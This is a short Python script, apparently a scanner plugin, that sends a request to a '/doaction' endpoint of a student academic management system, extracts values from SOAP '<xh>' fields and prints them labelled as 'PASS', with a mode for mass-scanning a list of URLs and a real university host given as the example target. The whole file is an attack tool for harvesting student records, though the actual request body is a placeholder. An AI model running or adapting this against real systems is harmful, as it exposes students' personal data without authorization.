#!/usr/bin/python
#-*- encoding:utf-8 -*-
import re
from sys import argv
from dummy import *
def audit(arg):                     #curl2(POST)
    raw = "__HTTP_Header__"
    url = arg + '/doaction'
    code, head,res, errcode, _ = curl.curl2(url,raw=raw)
    if 'xsi:type="types:StudentCheckinInfo"' in res:
        mima = re.findall('<xh xsi:type="xsd:string">(.*?)</xh>',res,)
        print u'URI:%s  PASS:%s\n'% (arg,mima)


if (len(argv)==1):
    print u'''
eg：
Single：inject.py jxgl.hdu.edu.cn (without http://)
Multi：inject.py url.txt (URl List)
'''
elif (argv[1]=='url.txt'): 
    for i in open("url.txt"):
        audit(i)
else:
    audit(argv[1])
